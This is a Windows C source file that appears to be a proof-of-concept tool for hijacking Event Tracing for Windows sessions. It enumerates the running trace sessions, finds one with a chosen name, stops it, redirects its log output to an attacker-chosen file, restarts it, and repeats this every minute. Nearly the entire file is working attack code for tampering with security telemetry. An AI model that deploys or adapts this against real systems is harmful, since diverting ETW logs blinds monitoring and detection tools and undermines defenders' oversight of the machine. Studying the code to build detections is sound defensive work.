#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <evntrace.h>
#include <tchar.h>


#define SESSION_TO_HIJACK L"TESTER"
#define HIJACK_LOG L"C:\\hijacked.etl"


BOOL GetSession() {

    PEVENT_TRACE_PROPERTIES ETWLoggers[64] = { 0 };
    PEVENT_TRACE_PROPERTIES StorageBuffer = NULL,
        ToFree = NULL;
    //Size in bytes for a single property
    ULONG PropertySize = sizeof(EVENT_TRACE_PROPERTIES) * 1024 * sizeof(TCHAR);
    //Size of all returned trace sessions - max 64
    ULONG SpaceNeeded = 64 * PropertySize;
    LPTSTR LoggerName = NULL;


    //Allocating a buffer to hold all tracing sessions
    StorageBuffer = (PEVENT_TRACE_PROPERTIES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SpaceNeeded);
    if (!StorageBuffer) {
        printf("[!] Could not allocate space\n");
        return FALSE;
    }

    ToFree = StorageBuffer;

    printf("[*] Initializing buffer\n");
    //Initialize every 'EVENT_TRACE_PROPERTIES' struct 'StorageBuffer' in and save it to the 'ETWLoggers' array
    for (ULONG LogCount = 0; LogCount < 64; LogCount++) {
        
        //Init needed element
        StorageBuffer->Wnode.BufferSize = PropertySize;

        //Save the pointer in the array
        ETWLoggers[LogCount] = StorageBuffer;

        //Move to the next struct
        StorageBuffer = (PEVENT_TRACE_PROPERTIES)((PUCHAR)StorageBuffer + StorageBuffer->Wnode.BufferSize);
    }

    printf("[*] Querying all sessions\n");
    //Query all running tracing sessions
    ULONG returnCount = 0;
    ULONG status = QueryAllTracesW(ETWLoggers, 64, &returnCount);
    if (status != ERROR_SUCCESS) {
        printf("[! QUeryAllTracesW failed: 0x%X\n", status);
        goto _Cleanup;
    }

    printf("[*] Parsing tracing sessions names\n");
    for (ULONG LogCount = 0; LogCount < returnCount; LogCount++) {
        
        //Calculate the address of the logger name
        if (
         (ETWLoggers[LogCount]->LoggerNameOffset > 0) 
         && (ETWLoggers[LogCount]->LoggerNameOffset < ETWLoggers[LogCount]->Wnode.BufferSize)) 
        {
            LoggerName = (LPTSTR)((PUCHAR)ETWLoggers[LogCount] + ETWLoggers[LogCount]->LoggerNameOffset);
#ifdef SESSION_TO_HIJACK
            if (LoggerName != NULL && wcscmp(LoggerName, SESSION_TO_HIJACK) == 0) {
                printf("[*] Matching session found, attempting to hijack it\n");
                //Hijack the session
                if (!IsHijacked(ETWLoggers[LogCount])) {
                    HijackSess(ETWLoggers[LogCount]);
                    break;
                }
                else {
                    printf("[*] Session: %s is already hijacked\n", SESSION_TO_HIJACK);
                    break;
                }
            }

#elif !defined(SESSION_TO_HIJACK)
            _tprintf(_T("Logging session: %s\n"), LoggerName);
#endif
        }
    }
    HeapFree(GetProcessHeap(), 0, ToFree);
    return TRUE;


 _Cleanup:
    HeapFree(GetProcessHeap(), 0, ToFree);
    return FALSE;
}


#ifdef SESSION_TO_HIJACK
BOOL HijackSess(PEVENT_TRACE_PROPERTIES pSessionProperties) {

    ULONG status = 0;
    TRACEHANDLE sHand = NULL;


    printf("[*] Stopping the ETW tracing session\n");
    //Attempt to stop the session
    status = StopTraceW((TRACEHANDLE)0, SESSION_TO_HIJACK, pSessionProperties);
    if (status != ERROR_SUCCESS) {
        printf("[!] Failed stopping ETW trace session: 0x%X\n", status);
        return FALSE;
    }

    wprintf(L"[*] Updating the output file to: %s\n", HIJACK_LOG);
    //Copy the fake log file to the sessions's log file path property
    LPTSTR logFile = (LPTSTR)((PUCHAR)pSessionProperties + pSessionProperties->LogFileNameOffset);
    wcscpy_s(logFile, 1024, HIJACK_LOG);

    printf("[*] Starting the ETW tracing session\n");
    //Attempt to start the session
    status = StartTraceW(&sHand, (LPCWSTR)SESSION_TO_HIJACK, pSessionProperties);
    if (status != ERROR_SUCCESS) {
        printf("[!] Failed starting ETW trace session: 0x%X\n", status);
        return FALSE;
    }
    printf("[*] Finished\n");
    return TRUE;
}


BOOL IsHijacked(PEVENT_TRACE_PROPERTIES pSessionProperties) {
    LPTSTR LogFile = (LPTSTR)((PCHAR)pSessionProperties + pSessionProperties->LogFileNameOffset);
    if (LogFile != NULL && wcscmp(LogFile, HIJACK_LOG) == 0) {
        return TRUE;
    }
    return FALSE;
}
#endif




int main()
{
    int minutes_to_sleep = 1;

#ifndef SESSION_TO_HIJACK
    GetSession();
    return 0;
#endif

    while (TRUE) {
        GetSession();
        Sleep((60 * minutes_to_sleep) * 1000);
    }

    return 0;
}
